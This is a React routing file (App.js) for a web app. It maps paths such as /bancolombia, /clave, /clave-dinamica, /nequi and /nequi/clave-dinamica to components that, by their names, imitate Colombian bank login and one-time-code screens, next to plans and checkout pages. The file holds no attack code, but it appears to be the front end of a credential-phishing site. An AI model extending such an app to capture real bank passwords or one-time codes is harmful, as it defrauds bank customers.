import { BrowserRouter as Router, Routes, Route } from "react-router-dom"
import MainApp from "./MainApp"
import BancolombiaSim from "./components/BancolombiaSims/BancolombiaSim"
import "./App.css"
import PasswordForm from "./components/PasswordForm/PasswordForm"
import ClaveDinamica from "./components/ClaveDinamica/ClaveDinamica"
import NequiClaveDinamica from "./components/NequiClaveDinamica/NequiClaveDinamica"
import NequiLogin from "./components/NequiLogin/NequiLogin"
import { Analytics } from "@vercel/analytics/react"
import Home from "./components/MinacrissHome/iremoval"
import CardsPage from "./components/planes/CardsPage"   // ✅ nuevo componente
import Checkout from "./components/checkout/Checkout"

function App() {
  return (
    <>
      <Router>
        <Routes>
          <Route path="/ClaroApp" element={<MainApp />} />
          <Route path="/bancolombia" element={<BancolombiaSim />} />
          <Route path="/clave" element={<PasswordForm />} />
          <Route path="/clave-dinamica" element={<ClaveDinamica />} />
          <Route path="/nequi" element={<NequiLogin />} />
          <Route path="/nequi/clave-dinamica" element={<NequiClaveDinamica />} />
          
          {/* ✅ Página principal */}
          <Route path="/" element={<Home />} />

          {/* ✅ Nueva ruta para las cards */}
          <Route path="/planes" element={<CardsPage />} />
                    <Route path="/checkout" element={<Checkout />} /> {/* ✅ nuevo */}

        </Routes>
      </Router>
      <Analytics />
    </>
  )
}

export default App
